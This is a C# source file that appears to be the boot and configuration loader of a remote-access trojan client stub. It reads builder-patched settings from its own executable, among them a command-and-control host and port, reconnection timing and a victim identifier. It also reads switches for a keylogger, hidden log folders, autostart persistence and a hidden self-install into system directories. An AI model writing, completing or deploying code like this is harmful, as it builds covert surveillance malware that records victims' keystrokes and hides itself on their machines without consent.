using Client.Models;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace Client.Controllers.Tools
{
    //BootController
    public static class Boot
    {
        private static string[] readerKey = { "host", "port", "recoTries", "identifier", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk" };
        public static string host { get; set; }     // HOST
        public static ushort port { get; set; }     // HOST
        public static int recoTries { get; set; }     // TIME BETWEEN RECONNECTION TRIES
        public static string identifier { get; set; }     // CLIENT NAME IDENTIFIER
        public static bool installStub { get; set; }     // INSTALL STUB
        public static bool hideSubDirectory { get; set; }     // INSTALL STUB
        public static bool hideFile { get; set; }     // INSTALL STUB
        public static string installSubDirectory = "";                           // INSTALL STUB
        public static string installFileName = "";                           // INSTALL STUB
        public static bool keyloggerEnabled { get; set; }     // KEYLOGGER
        public static bool hideLogsDir { get; set; }     // KEYLOGGER
        public static string keyLoggerDirectory { get; set; }     // KEYLOGGER
        public static string startupName { get; set; }     // AUTOSTART STUB
        public static bool autoStartEnabled { get; set; }     // AUTOSTART STUB
        public static string specialPATH;
        public static Environment.SpecialFolder SPECIALFOLDER;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);


        public static void Initialization()
        {
            foreach (string index in readerKey)
            {
                readFile(index);
            }
            FixDirectory();
        }

        public static void readFile(string readerkey)
        {
            StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);

            string readerString = reader.ReadToEnd();

            readerString = readerString.Substring(readerString.IndexOf("-START" + readerkey + "-"), readerString.IndexOf("-END" + readerkey + "-") - readerString.IndexOf("-START" + readerkey + "-"));

            // LOG IN SETTINGS
            if (readerkey == "host")
            {
                host = readerString.Replace("-START" + readerkey + "-", "");
            }
            else if (readerkey == "port")
            {
                port = ushort.Parse(readerString.Replace("-START" + readerkey + "-", ""));
            }
            else if (readerkey == "recoTries")
            {
                recoTries = int.Parse(readerString.Replace("-START" + readerkey + "-", ""));
            }
            else if (readerkey == "identifier")
            {
                identifier = readerString.Replace("-START" + readerkey + "-", "");
            }
            // KEYLOGGER SETTINGS
            else if (readerkey == "logDir")
            {
                keyLoggerDirectory = readerString.Replace("-START" + readerkey + "-", "");
            }
            // AUTOSTART SETTINGS
            else if (readerkey == "startupName")
            {
                startupName = readerString.Replace("-START" + readerkey + "-", "");
            }
            // INSTALL SETTINGS
            else if (readerkey == "installPath")
            {
                specialPATH = readerString.Replace("-START" + readerkey + "-", "");
            }
            else if (readerkey == "txtSubDirI")
            {
                installSubDirectory = readerString.Replace("-START" + readerkey + "-", "");
            }
            else if (readerkey == "txtFileNameI")
            {
                installFileName = readerString.Replace("-START" + readerkey + "-", "");
            }
            // BOOLEENS
            else if (readerkey == "chk")
            {
                int i = 0;
                string t = readerString.Replace("-START" + readerkey + "-", "");
                foreach (char c in t)
                {
                    if (i == 0)
                        keyloggerEnabled = (c == '1' ? true : false);
                    else if (i == 1)
                        hideLogsDir = (c == '1' ? true : false);
                    else if (i == 2)
                        autoStartEnabled = (c == '1' ? true : false);
                    else if (i == 3)
                        installStub = (c == '1' ? true : false);
                    else if (i == 4)
                        hideSubDirectory = (c == '1' ? true : false);
                    else if (i == 5)
                        hideFile = (c == '1' ? true : false);
                    i++;
                }
            }
            else
            {
                reader.Close();
                return;
            }
            reader.Close();
        }

        static void FixDirectory()
        {
            switch (specialPATH)
            {
                case "1":
                    SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
                    break;
                case "2":
                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFilesX86;
                    break;
                case "3":
                    SPECIALFOLDER = Environment.SpecialFolder.SystemX86;
                    break;
            }

            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

            if (AuthenticationController.Win64Bit) return;

            // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
            switch (SPECIALFOLDER)
            {
                case Environment.SpecialFolder.ProgramFilesX86:
                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
                    break;
                case Environment.SpecialFolder.SystemX86:
                    SPECIALFOLDER = Environment.SpecialFolder.System;
                    break;
            }

            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        }
    }
}